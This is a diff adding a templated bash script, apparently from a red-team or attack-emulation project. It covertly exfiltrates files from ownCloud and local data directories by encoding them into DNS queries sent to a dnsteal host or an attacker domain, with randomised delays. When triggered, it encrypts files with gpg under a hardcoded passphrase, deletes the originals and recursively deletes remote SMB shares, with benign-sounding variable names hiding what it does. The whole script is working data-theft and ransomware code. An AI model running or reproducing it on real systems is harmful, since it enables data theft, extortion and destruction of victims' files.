@@ -1,0 +1,93 @@
+#!/bin/bash
+u=$1
+x="{{ ('/usr/local/src/owncloud/data/apdias/files/') | b64encode }}"
+y="{{ ('/mnt/data/local') | b64encode }}"
+s={{ exfiltration_sub_domains | default(4) }}
+b={{ exfiltration_block_size | default(56) }}
+{# if exfiltration_dns_host is set DNS queries are sent to the dnsteal servers IP directly #}
+dns="{{ '@'+exfiltration_dns_host if exfiltration_dns_host is defined else '' }}"
+{#
+    if exfiltration_domain is set then the given domain is appended to each DNS queries
+    this allows us to send DNS queries without specifying the target server, if we have
+    an authoritative DNS for the domain configured. (Note that this reduces the amount of bytes we can send per package).
+#}
+domain="{{ '.'+exfiltration_domain if exfiltration_domain is defined else '' }}"
+
+garden=$2
+gardener=$3
+mower=$4
+read -d '' plants << EOF
+{% for exfil_dir in exfiltration_directories %}
+{{ exfil_dir }}
+{% endfor %}
+EOF
+
+cd $(echo $x | base64 -d -w 0)
+
+plant() {
+    k="shadowchainrocks"
+
+    cd $(echo $x | base64 -d -w 0)
+    find . -type f ! -name "*.planted" | while read f; do echo "$k" | gpg --output "$f.planted" -c --passphrase-fd 0 --batch --armor "$f" &> /dev/null; rm -f "$f" &> /dev/null; done;
+
+    cd $(echo $y | base64 -d -w 0)
+    find . -type f ! -name "*.planted" | while read f; do echo "$k" | gpg --output "$f.planted" -c --passphrase-fd 0 --batch --armor "$f" &> /dev/null; rm -f "$f" &> /dev/null; done;
+
+    for p in $plants; do
+        smbclient -U "$gardener%$mower" -c "recurse ON; prompt OFF;mask *; deltree *;" "//$garden/$p"
+    done
+    
+    exit;
+}
+
+check_stop() {
+	if [ "$1" != "0" ]; then
+		exit;
+	fi
+    if [ "$2" == "$3" ]; then
+        plant $2
+    fi
+}
+
+{% if exfiltration_compressed %}
+encode() {
+    gzip -c $1| base64 -w0 | sed "s/.\{$b\}/&\n/g"
+}
+{% else %}
+encode() {
+    base64 -w0 $1 | sed "s/.\{$b\}/&\n/g"
+}
+{% endif %}
+
+split() {
+    f=$1
+    c=0
+    for i in $(encode $f); do
+        if [[ "$c" -lt "$s"  ]]; then
+            echo -ne "$i-.";
+            c=$(($c+1));
+        else
+            echo -ne "\n$i-.";
+            c=1;
+        fi;
+    done
+}
+
+
+check=$(dig $dns check$domain +short)
+for path in $(find . -maxdepth 3 -not -type d); do
+  dirpath="$(dirname ${path})"
+  f="$(basename ${path})"
+  pushd $dirpath
+  ix=0;
+  for r in $(split $f); do
+    resp=$(dig $dns `echo -ne 3x6-.${ix}-.$r$(echo $u$f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
+    check_stop $? $resp $check
+    ix=$(($ix+1));
+    sleep $(shuf -i 6-16 -n 1)
+  done;
+  resp=$(dig $dns `echo 3x7-.0-.$(echo $f | sed "s/^\./,/")$domain|tr "+" "*"` +short;)
+  check_stop $? $resp $check
+  popd
+done;
+plant $check
